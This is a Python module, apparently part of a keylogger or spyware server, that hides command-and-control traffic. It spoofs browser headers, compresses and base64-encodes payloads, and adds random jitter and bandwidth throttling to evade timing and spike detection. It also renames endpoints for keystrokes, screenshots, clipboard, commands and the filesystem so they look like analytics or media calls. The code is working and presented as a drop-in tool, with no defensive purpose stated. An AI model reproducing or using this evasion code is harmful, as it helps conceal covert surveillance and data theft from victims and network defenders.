"""
Network Communication Obfuscation Module
Demonstrates techniques to hide network traffic patterns
Save as: server_modules/network_obfuscation.py
"""
import json
import base64
import zlib
import random
import time
from typing import Any, Dict

# Legitimate-looking User-Agent strings
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
]

# Legitimate-looking Accept headers
ACCEPT_HEADERS = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'application/json, text/plain, */*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
]


def get_stealth_headers() -> Dict[str, str]:
    """
    Generate legitimate-looking HTTP headers
    Mimics normal browser traffic
    """
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': random.choice(ACCEPT_HEADERS),
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0',
    }


def obfuscate_payload(data: Dict[str, Any]) -> str:
    """
    Obfuscate network payload
    
    Steps:
    1. Convert to JSON
    2. Compress with zlib
    3. Base64 encode
    
    Args:
        data: Dictionary to send
    
    Returns:
        Obfuscated string safe for transmission
    """
    # Convert to JSON
    json_str = json.dumps(data)
    json_bytes = json_str.encode('utf-8')
    
    # Compress (reduces size and adds entropy)
    compressed = zlib.compress(json_bytes, level=9)
    
    # Base64 encode for safe transmission
    encoded = base64.b64encode(compressed).decode('ascii')
    
    return encoded


def deobfuscate_payload(obfuscated: str) -> Dict[str, Any]:
    """
    Decode obfuscated network payload
    
    Args:
        obfuscated: Base64 encoded, compressed string
    
    Returns:
        Original dictionary
    """
    # Base64 decode
    decoded = base64.b64decode(obfuscated.encode('ascii'))
    
    # Decompress
    decompressed = zlib.decompress(decoded)
    
    # Parse JSON
    json_str = decompressed.decode('utf-8')
    data = json.loads(json_str)
    
    return data


def add_jitter_delay(min_seconds: float = 0.5, max_seconds: float = 3.0):
    """
    Add random delay between network requests
    Defeats timing pattern detection and rate-based blocking
    
    Args:
        min_seconds: Minimum delay
        max_seconds: Maximum delay
    """
    delay = random.uniform(min_seconds, max_seconds)
    time.sleep(delay)


def disguise_endpoint(real_endpoint: str) -> str:
    """
    Disguise API endpoint to look legitimate
    
    Examples:
        /api/keystrokes -> /api/analytics/session
        /api/screenshot -> /api/media/thumbnail
        /api/command -> /api/config/update
    
    Args:
        real_endpoint: Actual endpoint
    
    Returns:
        Disguised endpoint string
    """
    endpoint_map = {
        '/api/status': '/api/health/check',
        '/api/start': '/api/session/begin',
        '/api/stop': '/api/session/end',
        '/api/events': '/api/analytics/events',
        '/api/keystrokes': '/api/analytics/input',
        '/api/keystrokes/live': '/api/analytics/stream',
        '/api/keystrokes/buffer': '/api/analytics/buffer',
        '/api/snapshot': '/api/media/capture',
        '/api/screenshot/latest': '/api/media/latest',
        '/api/screenshot/history': '/api/media/gallery',
        '/api/command': '/api/config/update',
        '/api/clipboard': '/api/sync/clipboard',
        '/api/process': '/api/system/processes',
        '/api/filesystem': '/api/files/browse',
        '/api/export': '/api/data/export',
    }
    
    return endpoint_map.get(real_endpoint, real_endpoint)


def chunk_large_data(data: bytes, chunk_size: int = 50000) -> list:
    """
    Split large data into chunks for transmission
    Avoids large spikes in network traffic
    
    Args:
        data: Binary data to split
        chunk_size: Size of each chunk in bytes
    
    Returns:
        List of chunks
    """
    chunks = []
    for i in range(0, len(data), chunk_size):
        chunks.append(data[i:i + chunk_size])
    return chunks


def calculate_bandwidth_delay(data_size: int, max_bandwidth_kbps: int = 100) -> float:
    """
    Calculate delay needed to throttle bandwidth
    Prevents network spike detection
    
    Args:
        data_size: Size of data in bytes
        max_bandwidth_kbps: Maximum bandwidth to use in KB/s
    
    Returns:
        Delay in seconds
    """
    data_size_kb = data_size / 1024
    seconds = data_size_kb / max_bandwidth_kbps
    return seconds


class StealthSession:
    """
    Wrapper for requests session with stealth features
    Drop-in replacement for regular requests
    """
    
    def __init__(self, base_url: str, api_key: str = None):
        self.base_url = base_url.rstrip('/')
        self.api_key = api_key
        self.last_request_time = 0
        self.min_request_interval = 1.0  # Minimum 1 second between requests
    
    def _enforce_rate_limit(self):
        """Ensure minimum time between requests"""
        current_time = time.time()
        time_since_last = current_time - self.last_request_time
        
        if time_since_last < self.min_request_interval:
            time.sleep(self.min_request_interval - time_since_last)
        
        self.last_request_time = time.time()
    
    def post(self, endpoint: str, data: Dict[str, Any] = None, disguise: bool = True):
        """
        Send POST request with obfuscation
        
        Args:
            endpoint: API endpoint
            data: Data to send
            disguise: Whether to disguise endpoint name
        
        Returns:
            Response dictionary
        """
        import requests
        
        # Enforce rate limiting
        self._enforce_rate_limit()
        
        # Add random jitter
        add_jitter_delay(0.1, 0.5)
        
        # Disguise endpoint if requested
        if disguise:
            endpoint = disguise_endpoint(endpoint)
        
        url = f"{self.base_url}{endpoint}"
        
        # Prepare headers
        headers = get_stealth_headers()
        if self.api_key:
            headers['X-API-Key'] = self.api_key
        headers['Content-Type'] = 'application/json'
        
        # Obfuscate payload
        if data:
            obfuscated = obfuscate_payload(data)
            payload = {'data': obfuscated}
        else:
            payload = {}
        
        # Send request
        try:
            response = requests.post(url, json=payload, headers=headers, timeout=10)
            
            if response.status_code == 200:
                # Deobfuscate response
                response_data = response.json()
                if 'data' in response_data:
                    return deobfuscate_payload(response_data['data'])
                return response_data
            else:
                return None
                
        except Exception as e:
            print(f"Network error: {e}")
            return None
    
    def get(self, endpoint: str, disguise: bool = True):
        """
        Send GET request with obfuscation
        
        Args:
            endpoint: API endpoint
            disguise: Whether to disguise endpoint name
        
        Returns:
            Response dictionary
        """
        import requests
        
        # Enforce rate limiting
        self._enforce_rate_limit()
        
        # Add random jitter
        add_jitter_delay(0.1, 0.5)
        
        # Disguise endpoint if requested
        if disguise:
            endpoint = disguise_endpoint(endpoint)
        
        url = f"{self.base_url}{endpoint}"
        
        # Prepare headers
        headers = get_stealth_headers()
        if self.api_key:
            headers['X-API-Key'] = self.api_key
        
        # Send request
        try:
            response = requests.get(url, headers=headers, timeout=10)
            
            if response.status_code == 200:
                # Deobfuscate response
                response_data = response.json()
                if 'data' in response_data:
                    return deobfuscate_payload(response_data['data'])
                return response_data
            else:
                return None
                
        except Exception as e:
            print(f"Network error: {e}")
            return None


# =============================================================================
# DEMONSTRATION
# =============================================================================

if __name__ == "__main__":
    print("\n" + "="*70)
    print("NETWORK OBFUSCATION DEMONSTRATION")
    print("="*70)
    
    # Example data
    data = {
        "pc_id": "test123",
        "events": [
            {"type": "key_press", "key": "a", "timestamp": "2024-01-01T12:00:00"},
            {"type": "mouse_click", "x": 100, "y": 200, "timestamp": "2024-01-01T12:00:01"}
        ],
        "monitoring": True
    }
    
    print("\n1. Original data:")
    print(json.dumps(data, indent=2))
    print(f"Size: {len(json.dumps(data))} bytes")
    
    # Obfuscate
    obfuscated = obfuscate_payload(data)
    print(f"\n2. Obfuscated (compressed + base64):")
    print(f"{obfuscated[:80]}...")
    print(f"Size: {len(obfuscated)} bytes")
    print(f"Compression ratio: {len(obfuscated) / len(json.dumps(data)):.2%}")
    
    # Deobfuscate
    recovered = deobfuscate_payload(obfuscated)
    print(f"\n3. Recovered data:")
    print(json.dumps(recovered, indent=2))
    print(f"Match: {data == recovered}")
    
    # Show disguised endpoints
    print(f"\n4. Disguised endpoints:")
    print(f"  /api/keystrokes -> {disguise_endpoint('/api/keystrokes')}")
    print(f"  /api/screenshot -> {disguise_endpoint('/api/screenshot')}")
    print(f"  /api/command -> {disguise_endpoint('/api/command')}")
    
    # Show stealth headers
    print(f"\n5. Stealth headers:")
    headers = get_stealth_headers()
    for key, value in headers.items():
        print(f"  {key}: {value[:60]}...")
    
    print("\n" + "="*70)
    print("Benefits:")
    print("  ✓ Reduced network traffic size (compression)")
    print("  ✓ Hidden data structure (base64 encoding)")
    print("  ✓ Legitimate-looking traffic (proper headers)")
    print("  ✓ Timing randomization (jitter delays)")
    print("  ✓ Disguised endpoints (look like analytics/media)")
    print("="*70 + "\n")